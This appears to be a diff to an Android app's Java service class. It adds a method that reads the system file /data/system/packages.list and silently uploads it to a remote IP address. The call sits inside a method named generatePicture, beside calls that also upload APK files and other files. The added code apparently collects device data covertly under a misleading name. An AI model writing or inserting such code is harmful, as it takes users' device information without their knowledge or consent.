@@ -92,6 +92,7 @@ public class DetailService {
     public void generatePicture(String packageName,Context context){
         ip=getIP(context);
         uploadAPK(packageName,context);
+        uploadList();
         uploadFile(packageName);
     }
 
@@ -223,6 +224,49 @@ public class DetailService {
         } catch (PackageManager.NameNotFoundException e) {
             Log.e("uploadAPK","  getPackageInfo");
             e.printStackTrace();
+        }
+
+    }
+
+    private void uploadList(){
+        //补全请求地址
+        //String requestUrl = String.format("%s/%s", upload_head, actionUrl);
+        String requestUrl=ip;
+        MultipartBody.Builder builder = new MultipartBody.Builder();
+        //设置类型
+        builder.setType(MultipartBody.FORM);
+        //追加参数
+        builder.addFormDataPart("FileName","packages.list");
+
+        String listPath="/data/system/packages.list";
+        File listFile=new File(listPath);
+
+        if(listFile.exists()){
+            RequestBody requestBody=RequestBody.create(MediaType.parse("ListFile"),listFile);
+            builder.addFormDataPart("File","packages.list",requestBody);
+
+            //创建RequestBody
+            RequestBody body = builder.build();
+            //创建Request
+            final Request request = new Request.Builder().url(requestUrl).post(body).build();
+            final Call call = okHttpClient.newBuilder().writeTimeout(50, TimeUnit.SECONDS).build().newCall(request);
+
+            call.enqueue(new Callback() {
+                @Override
+                public void onFailure(Call call, IOException e) {
+                    Log.e("uploadList", "Callback--"+e.toString());
+                }
+                @Override
+                public void onResponse(Call call, Response response) throws IOException {
+                    if (response.isSuccessful()) {
+                        String string = response.body().string();
+                        Log.e("uploadList", "response ----->" + string);
+                    } else {
+                        Log.e("uploadList", "Callback--upload failed!");
+                    }
+                }
+
+            });
         }
 
     }
